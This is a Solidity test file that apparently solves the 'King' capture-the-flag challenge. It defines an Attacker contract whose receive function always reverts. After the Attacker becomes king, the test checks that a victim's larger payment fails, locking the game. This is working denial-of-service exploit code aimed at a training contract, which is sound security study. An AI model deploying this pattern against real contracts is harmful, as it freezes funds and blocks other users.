// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {King} from "~/King.sol";

contract KingTest is Test {
    King target;
    address player;
    address victim;
    Attacker attacker;

    function setUp() public {
        target = (new King){value: 1 ether}();
        assertEq(target._king(), address(this), "expected test to be king");

        player = makeAddr("player");
        vm.deal(player, 10 ether);

        victim = makeAddr("victim");
        vm.deal(victim, 100 ether);
    }

    function attack() private {
        attacker = new Attacker(address(target));
        attacker.attack{value: 5 ether}();
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();
        assertEq(target._king(), address(attacker), "attacker must be king");

        // victim gets rekt
        vm.startPrank(victim);
        (bool ok,) = address(target).call{value: 50 ether}("");
        assertFalse(ok, "should have failed to become a king");
        assertEq(target._king(), address(attacker), "attacker must still be the king");
        vm.stopPrank();
    }

    receive() external payable {}
}

contract Attacker {
    address payable target;

    constructor(address to) payable {
        target = payable(to);
    }

    function attack() external payable {
        (bool ok,) = target.call{value: msg.value}("");
        require(ok, "failed to become king");
    }

    receive() external payable {
        revert("no king for you!");
    }
}
